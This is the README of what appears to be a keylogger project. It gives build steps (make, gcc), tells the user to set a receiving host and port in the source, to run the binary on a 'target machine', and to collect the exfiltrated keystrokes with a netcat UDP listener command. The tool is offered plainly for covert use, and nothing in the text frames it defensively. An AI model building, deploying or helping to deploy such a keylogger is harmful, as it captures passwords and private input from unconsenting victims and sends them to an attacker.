# what is this?
well, good'ol keylogger

# how to use?
couple dependecies

- make
- gcc
- netcat to recive keylogs

you wanna add the hostname and port of the receiving machine in the source file `src/keylogger.c` which you are going to use to recieve keylogs

the repo has makefile, so just compile with

```
make keylogger
```

the executable will be in `bin` directory,
run it on target machine

and run this netcat command on recieving machine with the port you decided earlier

```
nc -ulkp <port>
```
enjoy the keylogs ;)
